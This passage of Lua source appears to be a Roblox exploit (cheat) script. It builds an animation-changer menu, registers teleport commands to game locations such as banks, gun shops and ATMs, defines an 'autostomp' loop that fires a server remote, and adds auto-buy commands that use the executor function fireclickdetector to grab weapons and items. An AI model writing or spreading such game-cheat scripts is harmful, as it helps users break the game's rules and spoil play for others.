			A_Ghost.Position = UDim2.new(0, 0, 0.900632322, 0)
			A_Ghost.Size = UDim2.new(0, 150, 0, 30)
			A_Ghost.Font = Enum.Font.SciFi
			A_Ghost.Text = "Ghost"
			A_Ghost.TextColor3 = Color3.new(1, 1, 1)
			A_Ghost.TextSize = 20
			A_Ghost.MouseButton1Click:Connect(function()
				game.Players.LocalPlayer.Character.Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=616006778"
				game.Players.LocalPlayer.Character.Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=616008087"
				game.Players.LocalPlayer.Character.Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=616013216"
				game.Players.LocalPlayer.Character.Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=616013216"
				game.Players.LocalPlayer.Character.Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=616008936"
				game.Players.LocalPlayer.Character.Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=616005863"
				game.Players.LocalPlayer.Character.Animate.swimidle.SwimIdle.AnimationId = "http://www.roblox.com/asset/?id=616012453"
				game.Players.LocalPlayer.Character.Animate.swim.Swim.AnimationId = "http://www.roblox.com/asset/?id=616011509"
				game.Players.LocalPlayer.Character.Humanoid.Jump = true
			end)

			A_Sneaky.Name = "A_Sneaky"
			A_Sneaky.Parent = SpecialTab
			A_Sneaky.BackgroundColor3 = Color3.new(0.196078, 0.196078, 0.196078)
			A_Sneaky.BorderSizePixel = 0
			A_Sneaky.Position = UDim2.new(0, 0, 0.517628431, 0)
			A_Sneaky.Size = UDim2.new(0, 150, 0, 30)
			A_Sneaky.Font = Enum.Font.SciFi
			A_Sneaky.Text = "Sneaky"
			A_Sneaky.TextColor3 = Color3.new(1, 1, 1)
			A_Sneaky.TextSize = 20
			A_Sneaky.MouseButton1Click:Connect(function()
				game.Players.LocalPlayer.Character.Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=1132473842"
				game.Players.LocalPlayer.Character.Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=1132477671"
				game.Players.LocalPlayer.Character.Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=1132510133"
				game.Players.LocalPlayer.Character.Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=1132494274"
				game.Players.LocalPlayer.Character.Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=1132489853"
				game.Players.LocalPlayer.Character.Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=1132461372"
				game.Players.LocalPlayer.Character.Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=1132469004"
				game.Players.LocalPlayer.Character.Humanoid.Jump = true
			end)

			A_Princess.Name = "A_Princess"
			A_Princess.Parent = SpecialTab
			A_Princess.BackgroundColor3 = Color3.new(0.196078, 0.196078, 0.196078)
			A_Princess.BorderSizePixel = 0
			A_Princess.Position = UDim2.new(0, 0, 0.645296335, 0)
			A_Princess.Size = UDim2.new(0, 150, 0, 30)
			A_Princess.Font = Enum.Font.SciFi
			A_Princess.Text = "Princess"
			A_Princess.TextColor3 = Color3.new(1, 1, 1)
			A_Princess.TextSize = 20
			A_Princess.MouseButton1Click:Connect(function()
				game.Players.LocalPlayer.Character.Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=941003647"
				game.Players.LocalPlayer.Character.Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=941013098"
				game.Players.LocalPlayer.Character.Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=941028902"
				game.Players.LocalPlayer.Character.Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=941015281"
				game.Players.LocalPlayer.Character.Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=941008832"
				game.Players.LocalPlayer.Character.Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=940996062"
				game.Players.LocalPlayer.Character.Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=941000007"
				game.Players.LocalPlayer.Character.Humanoid.Jump = true
			end)

			Category_2.Name = "Category"
			Category_2.Parent = SpecialTab
			Category_2.BackgroundColor3 = Color3.new(0.156863, 0.156863, 0.156863)
			Category_2.BorderSizePixel = 0
			Category_2.Size = UDim2.new(0, 150, 0, 30)
			Category_2.Text = "Special"
			Category_2.TextColor3 = Color3.new(0, 0.835294, 1)
			Category_2.TextSize = 14

			OtherTab.Name = "OtherTab"
			OtherTab.Parent = Main
			OtherTab.BackgroundColor3 = Color3.new(0.278431, 0.278431, 0.278431)
			OtherTab.BackgroundTransparency = 1
			OtherTab.BorderSizePixel = 0
			OtherTab.Position = UDim2.new(0, 0, 1.06800008, 0)
			OtherTab.Size = UDim2.new(0, 150, 0, 220)

			Category_3.Name = "Category"
			Category_3.Parent = OtherTab
			Category_3.BackgroundColor3 = Color3.new(0.156863, 0.156863, 0.156863)
			Category_3.BorderSizePixel = 0
			Category_3.Size = UDim2.new(0, 150, 0, 30)
			Category_3.Text = "Other"
			Category_3.TextColor3 = Color3.new(0, 0.835294, 1)
			Category_3.TextSize = 14

			A_None.Name = "A_None"
			A_None.Parent = OtherTab
			A_None.BackgroundColor3 = Color3.new(0.196078, 0.196078, 0.196078)
			A_None.BorderSizePixel = 0
			A_None.Position = UDim2.new(0, 0, 0.134545445, 0)
			A_None.Size = UDim2.new(0, 150, 0, 30)
			A_None.Font = Enum.Font.SciFi
			A_None.Text = "None"
			A_None.TextColor3 = Color3.new(1, 1, 1)
			A_None.TextSize = 20
			A_None.MouseButton1Click:Connect(function()
				game.Players.LocalPlayer.Character.Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=0"
				game.Players.LocalPlayer.Character.Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=0"
				game.Players.LocalPlayer.Character.Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=0"
				game.Players.LocalPlayer.Character.Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=0"
				game.Players.LocalPlayer.Character.Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=0"
				game.Players.LocalPlayer.Character.Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=0"
				game.Players.LocalPlayer.Character.Animate.swimidle.SwimIdle.AnimationId = "http://www.roblox.com/asset/?id=0"
				game.Players.LocalPlayer.Character.Animate.swim.Swim.AnimationId = "http://www.roblox.com/asset/?id=0"
				game.Players.LocalPlayer.Character.Humanoid.Jump = true
			end)

			A_Anthro.Name = "A_Anthro"
			A_Anthro.Parent = OtherTab
			A_Anthro.BackgroundColor3 = Color3.new(0.196078, 0.196078, 0.196078)
			A_Anthro.BorderSizePixel = 0
			A_Anthro.Position = UDim2.new(0, 0, 0.269090891, 0)
			A_Anthro.Size = UDim2.new(0, 150, 0, 30)
			A_Anthro.Font = Enum.Font.SciFi
			A_Anthro.Text = "Anthro (Default)"
			A_Anthro.TextColor3 = Color3.new(1, 1, 1)
			A_Anthro.TextSize = 20
			A_Anthro.MouseButton1Click:Connect(function()
				game.Players.LocalPlayer.Character.Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=2510196951"
				game.Players.LocalPlayer.Character.Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=2510197257"
				game.Players.LocalPlayer.Character.Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=2510202577"
				game.Players.LocalPlayer.Character.Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=2510198475"
				game.Players.LocalPlayer.Character.Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=2510197830"
				game.Players.LocalPlayer.Character.Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=2510192778"
				game.Players.LocalPlayer.Character.Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=2510195892"
				game.Players.LocalPlayer.Character.Humanoid.Jump = true
			end)

			Main:TweenPosition(UDim2.new(0.421999991, 0, 0.28400004, 0))
		end;
	});

	-- I can't be bothered writing these so
	addCommand({
		["Name"] = "bank";
		["Function"] = function()
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-485.668, 23.631, -285.169)
		end;
	});

	addCommand({
		["Name"] = "hoodfitness";
		["Function"] = function()
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-75.795, 23.701, -633.72)
		end;
	});

	addCommand({
		["Name"] = "fitness";
		["Function"] = function()
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-75.795, 23.701, -633.72)
		end;
	});

	addCommand({
		["Name"] = "tyrones1";
		["Function"] = function()
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-582, 7.172, -739.015)
		end;
	});

	addCommand({
		["Name"] = "gunshop1";
		["Function"] = function()
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-582, 7.172, -739.015)
		end;
	});

	addCommand({
		["Name"] = "tyrones2";
		["Function"] = function()
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(475.022, 48.005, -603.737)
		end;
	});

	addCommand({
		["Name"] = "gunshop2";
		["Function"] = function()
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(475.022, 48.005, -603.737)
		end;
	});

	addCommand({
		["Name"] = "ufo";
		["Function"] = function()
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(71.565, 142.926, -690.33)
		end;
	});

	addCommand({
		["Name"] = "ufohill";
		["Function"] = function()
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(71.565, 142.926, -690.33)
		end;
	});

	addCommand({
		["Name"] = "prison";
		["Function"] = function()
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-294.162, 22.644, -111.716)
		end;
	});

	addCommand({
		["Name"] = "jail";
		["Function"] = function()
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-294.162, 22.644, -111.716)
		end;
	});

	addCommand({
		["Name"] = "jailcell";
		["Function"] = function()
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-294.162, 22.644, -111.716)
		end;
	});

	addCommand({
		["Name"] = "phone";
		["Function"] = function()
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-120.121, 22.946, -870.425)
		end;
	});

	addCommand({
		["Name"] = "phoneshop";
		["Function"] = function()
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-120.121, 22.946, -870.425)
		end;
	});

	addCommand({
		["Name"] = "sewers";
		["Function"] = function()
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(112.622, -26.212, -277.321)
		end;
	});

	addCommand({
		["Name"] = "admin";
		["Function"] = function()
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-729.895, -37.642, -885.8)
		end;
	});

	addCommand({
		["Name"] = "adminbase";
		["Function"] = function()
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-729.895, -37.642, -885.8)
		end;
	});

	addCommand({
		["Name"] = "secret";
		["Function"] = function()
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-729.895, -37.642, -885.8)
		end;
	});

	addCommand({
		["Name"] = "secretbase";
		["Function"] = function()
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-729.895, -37.642, -885.8)
		end;
	});


	addCommand({
		["Name"] = "playground";
		["Function"] = function()
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-186.082, 21.829, -763.115)
		end;
	});

	addCommand({
		["Name"] = "boxing";
		["Function"] = function()
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-236.006, 23.151, -1120.531)
		end;
	});

	addCommand({
		["Name"] = "hoodboxing";
		["Function"] = function()
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-236.006, 23.151, -1120.531)
		end;
	});

	addCommand({
		["Name"] = "hospital";
		["Function"] = function()
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(86.518, 21.755, -481.680)
		end;
	});

	addCommand({
		["Name"] = "tacoshop";
		["Function"] = function()
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(546.946, 51.061, -493.325)
		end;
	});

	addCommand({
		["Name"] = "church";
		["Function"] = function()
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(203.938, 21.75, -98.446)
		end;
	});

	addCommand({
		["Name"] = "graveyard";
		["Function"] = function()
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(198.268, 21.749, 34.383)
		end;
	});

	addCommand({
		["Name"] = "klips";
		["Function"] = function()
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(5.658, 21.75, -101.094)
		end;
	});

	addCommand({
		["Name"] = "fire";
		["Function"] = function()
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-132.674, 21.280, -145.176)
		end;
	});

	addCommand({
		["Name"] = "firefighter";
		["Function"] = function()
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-132.674, 21.280, -145.176)
		end;
	});

	addCommand({
		["Name"] = "furniture";
		["Function"] = function()
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-491.367, 21.253, -131.165)
		end;
	});

	addCommand({
		["Name"] = "park";
		["Function"] = function()
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(360.966, 48.5, -522.987)
		end;
	});

	addCommand({
		["Name"] = "casino";
		["Function"] = function()
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-879.277, 21.254, -190.199)
		end;
	});

	addCommand({
		["Name"] = "dacasino";
		["Function"] = function()
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-879.277, 21.254, -190.199)
		end;
	});

	addCommand({
		["Name"] = "theatre";
		["Function"] = function()
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-1004.420, 21.254, -180.739)
		end;
	});

	addCommand({
		["Name"] = "basketball"; -- Basketball Pitch / Court
		["Function"] = function()
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-908.901, 21.999, -500.778)
		end;
	});

	addCommand({
		["Name"] = "skateboard"; -- Skateboard Pitch / Court
		["Function"] = function()
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-825.686, 21.999, -549.293)
		end;
	});

	addCommand({
		["Name"] = "gas";
		["Function"] = function()
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(595.377, 49.000, -264.222)
		end;
	});

	addCommand({
		["Name"] = "food1";
		["Function"] = function()
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-333.492065, 23.6826477, -292.959625)
		end;
	});

	addCommand({
		["Name"] = "food2";
		["Function"] = function()
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(301.780121, 49.2826538, -619.999634)
		end;
	});

	addCommand({
		["Name"] = "police";
		["Function"] = function()
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-267.637, 21.807, -121.982)
		end;
	});

	addCommand({
		["Name"] = "policestation";
		["Function"] = function()
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-267.637, 21.807, -121.982)
		end;
	});

	addCommand({
		["Name"] = "atm1";
		["Function"] = function()
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-446.88, 26.461, -334.28)
		end;
	});

	addCommand({
		["Name"] = "atm2";
		["Function"] = function()
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(513.665, 49.726, -302.84)
		end;
	});

	addCommand({
		["Name"] = "atm3";
		["Function"] = function()
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-219.144, 23.633, -792.33)
		end;
	});

	addCommand({
		["Name"] = "atm4";
		["Function"] = function()
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-398.515, 23.353, -586.1)
		end;
	});

	addCommand({
		["Name"] = "atm5";
		["Function"] = function()
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-3.48, 21.638, -99.1)
		end;
	});

	addCommand({
		["Name"] = "atm6";
		["Function"] = function()
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-254.387, 21.579, -409.413)
		end;
	});

	addCommand({
		["Name"] = "atm7n8";
		["Function"] = function()
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(586.25, 51.687, -465.317)
		end;
	});

	addCommand({
		["Name"] = "atm9";
		["Function"] = function()
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(584.1, 48.661, -278.35)
		end;
	});

	addCommand({
		["Name"] = "atm10";
		["Function"] = function()
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(94.155, 22.961, -525.4)
		end;
	});

	addCommand({
		["Name"] = "atm11";
		["Function"] = function()
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-481.32, 22.794, -74.38)
		end;
	});

	addCommand({
		["Name"] = "testplate";
		["Function"] = function()
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-448.505, 49.5, 447.75)
		end;
	});

	addCommand({
		["Name"] = "safeafk";
		["Function"] = function()
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(169.126266, -121.450089, 182.002182)
		end;
	});

	addCommand({
		["Name"] = "chicken";
		["Function"] = function()
			_G.savedhumanoidpos = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-793.978027, -39.6492004, -938.048706)
			wait(.5)

			fireclickdetector(game.Workspace.Ignored.Shop['[Chicken] - $7'].ClickDetector)
			fireclickdetector(game.Workspace.Ignored.Shop['[Chicken] - $7'].ClickDetector)
			wait()
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(_G.savedhumanoidpos)
		end;
	});

	addCommand({
		["Name"] = "rpg";
		["Function"] = function()
			_G.savedhumanoidpos = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(113.657372, -26.7500305, -273.998535)
			wait(.5)

			fireclickdetector(game.Workspace.Ignored.Shop['[RPG] - $6000'].ClickDetector)
			fireclickdetector(game.Workspace.Ignored.Shop['[RPG] - $6000'].ClickDetector)
			wait()
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(_G.savedhumanoidpos)
		end;
	});

	addCommand({
		["Name"] = "view";
		["Function"] = function(str)
			local target;
			if (str) then
				target = findPlayer(str);
			end;

			if (loopVariables.Spectating == false) then
				loopVariables.Spectating = true
				game:GetService("Workspace"):FindFirstChild("Camera").CameraSubject = game:GetService("Players")[target.Name].Character:FindFirstChildOfClass("Humanoid");
				sendNotif("", "Now Spectating "..target.Name..".", 15);
			else
				loopVariables.Spectating = false;
				game:GetService("Workspace"):FindFirstChild("Camera").CameraSubject = game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Humanoid");
				sendNotif("", "Stopped Spectating "..target.Name..".", 15);
			end;
		end;
	})

	addCommand({
		["Name"] = "autostomp";
		["Function"] = function(str)
			if (loopVariables.Autostomp == false) then
				loopVariables.Autostomp = true;
				sendNotif("", "Autostomp Enabled.");
			else
				loopVariables.Autostomp = false;
				sendNotif("", "Autostomp Disabled.");
			end;

			while true do
				wait()
				if loopVariables.Autostomp == true then
					game.ReplicatedStorage.MainEvent:FireServer("Stomp")
				end
			end
		end;
	})

	addCommand({
		["Name"] = "grenade";
		["Function"] = function()
			_G.savedhumanoidpos = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(108.909653, -26.7500305, -273.868164)
			wait(.5)

			fireclickdetector(game.Workspace.Ignored.Shop['[Grenade] - $700'].ClickDetector)
			fireclickdetector(game.Workspace.Ignored.Shop['[Grenade] - $700'].ClickDetector)
			wait()
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(_G.savedhumanoidpos)
		end;
	});

	addCommand({
		["Name"] = "flashbang";
		["Function"] = function()
			_G.savedhumanoidpos = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(104.166924, -26.7500305, -273.964966)
			wait(.5)

			fireclickdetector(game.Workspace.Ignored.Shop['[Flashbang] - $550'].ClickDetector)
			fireclickdetector(game.Workspace.Ignored.Shop['[Flashbang] - $550'].ClickDetector)
			wait()
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(_G.savedhumanoidpos)
		end;
	});

	addCommand({
		["Name"] = "aug";
		["Function"] = function()
			_G.savedhumanoidpos = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-273.383636, 52.2636375, -215.37851)
			wait(.5)

			fireclickdetector(game.Workspace.Ignored.Shop['[AUG] - $1950'].ClickDetector)
			fireclickdetector(game.Workspace.Ignored.Shop['[AUG] - $1950'].ClickDetector)
			wait()
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(_G.savedhumanoidpos)
		end;
	});

	addCommand({
		["Name"] = "mask";
		["Function"] = function()
			_G.savedhumanoidpos = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(605.025513, 49.0000458, -267.874573)
			wait(.5)

			fireclickdetector(game.Workspace.Ignored.Shop['[Surgeon Mask] - $25'].ClickDetector)
			fireclickdetector(game.Workspace.Ignored.Shop['[Surgeon Mask] - $25'].ClickDetector)
			wait()
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(_G.savedhumanoidpos)
		end;
	});

	addCommand({
		["Name"] = "starblox";
		["Function"] = function()
			_G.savedhumanoidpos = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(603.11676, 49.0000458, -258.258484)
			wait(.5)

			fireclickdetector(game.Workspace.Ignored.Shop['[Starblox Latte] - $5'].ClickDetector)
			fireclickdetector(game.Workspace.Ignored.Shop['[Starblox Latte] - $5'].ClickDetector)
			wait()
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(_G.savedhumanoidpos)
		end;
	});

	addCommand({
		["Name"] = "moneygun";
		["Function"] = function()
			_G.savedhumanoidpos = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-885.262878, 21.75, -129.671936)
			wait(.5)

			fireclickdetector(game.Workspace.Ignored.Shop['[Money Gun] - $777'].ClickDetector)
			fireclickdetector(game.Workspace.Ignored.Shop['[Money Gun] - $777'].ClickDetector)
			wait()
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(_G.savedhumanoidpos)
		end;
	});

	addCommand({
		["Name"] = "popcorn";
		["Function"] = function()
			_G.savedhumanoidpos = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-994.783936, 24.6000137, -155.277405)
			wait(.5)

			fireclickdetector(game.Workspace.Ignored.Shop['[Popcorn] - $7'].ClickDetector)
			fireclickdetector(game.Workspace.Ignored.Shop['[Popcorn] - $7'].ClickDetector)
			wait()
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(_G.savedhumanoidpos)
		end;
	});

	addCommand({
		["Name"] = "sledgehammer";
		["Function"] = function()
			_G.savedhumanoidpos = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-901.614685, 21.75, -296.710327)
			wait(.5)

			fireclickdetector(game.Workspace.Ignored.Shop['[SledgeHammer] - $350'].ClickDetector)
			fireclickdetector(game.Workspace.Ignored.Shop['[SledgeHammer] - $350'].ClickDetector)
			wait()
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(_G.savedhumanoidpos)
		end;
	});

	addCommand({
		["Name"] = "barrel";
		["Function"] = function()
			_G.savedhumanoidpos = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-1039.53931, 21.75, -258.733154)
			wait(.5)

			fireclickdetector(game.Workspace.Ignored.Shop['[Double-Barrel SG] - $1400'].ClickDetector)
			fireclickdetector(game.Workspace.Ignored.Shop['[Double-Barrel SG] - $1400'].ClickDetector)
			wait()
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(_G.savedhumanoidpos)
		end;
	});

	addCommand({
		["Name"] = "pepperspray";
		["Function"] = function()
			_G.savedhumanoidpos = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(586.215881, 49.0000458, -250.845398)
			wait(.5)

			fireclickdetector(game.Workspace.Ignored.Shop['[PepperSpray] - $75'].ClickDetector)
			fireclickdetector(game.Workspace.Ignored.Shop['[PepperSpray] - $75'].ClickDetector)
			wait()
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(_G.savedhumanoidpos)
		end;
	});

	addCommand({
		["Name"] = "skullmask";
		["Function"] = function()
			_G.savedhumanoidpos = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(589.891174, 49.0000458, -267.351471)
			wait(.5)

			fireclickdetector(game.Workspace.Ignored.Shop['[Skull Mask] - $60'].ClickDetector)
			fireclickdetector(game.Workspace.Ignored.Shop['[Skull Mask] - $60'].ClickDetector)
			wait()
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(_G.savedhumanoidpos)
		end;
	});

	addCommand({
		["Name"] = "pumpkinmask";
		["Function"] = function()
			_G.savedhumanoidpos = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(595.746338, 49.0000458, -267.584595)
			wait(.5)

			fireclickdetector(game.Workspace.Ignored.Shop['[Pumpkin Mask] - $60'].ClickDetector)
			fireclickdetector(game.Workspace.Ignored.Shop['[Pumpkin Mask] - $60'].ClickDetector)
			wait()
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(_G.savedhumanoidpos)
		end;
	});

	addCommand({
		["Name"] = "donut";
		["Function"] = function()
			_G.savedhumanoidpos = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(602.692261, 49.0000458, -252.443069)
			wait(.5)

			fireclickdetector(game.Workspace.Ignored.Shop['[Donut] - $5'].ClickDetector)
			fireclickdetector(game.Workspace.Ignored.Shop['[Donut] - $5'].ClickDetector)
			wait()
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(_G.savedhumanoidpos)
		end;
	});

	addCommand({
		["Name"] = "pitchfork";
		["Function"] = function()
			_G.savedhumanoidpos = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(249.949081, 21.7499981, -29.1379757)
			wait(.5)

			fireclickdetector(game.Workspace.Ignored.Shop['[Pitchfork] - $320'].ClickDetector)
			fireclickdetector(game.Workspace.Ignored.Shop['[Pitchfork] - $320'].ClickDetector)
			wait()
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(_G.savedhumanoidpos)
		end;
	});

	addCommand({
		["Name"] = "flame";
		["Function"] = function()
			_G.savedhumanoidpos = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-157.208282, 53.8106155, -102.88887)
			wait(.5)

			fireclickdetector(game.Workspace.Ignored.Shop['[Flamethrower] - $7500'].ClickDetector)
			fireclickdetector(game.Workspace.Ignored.Shop['[Flamethrower] - $7500'].ClickDetector)
			wait()
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(_G.savedhumanoidpos)
		end;
	});

	addCommand({
		["Name"] = "paintballmask";
		["Function"] = function()
			_G.savedhumanoidpos = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
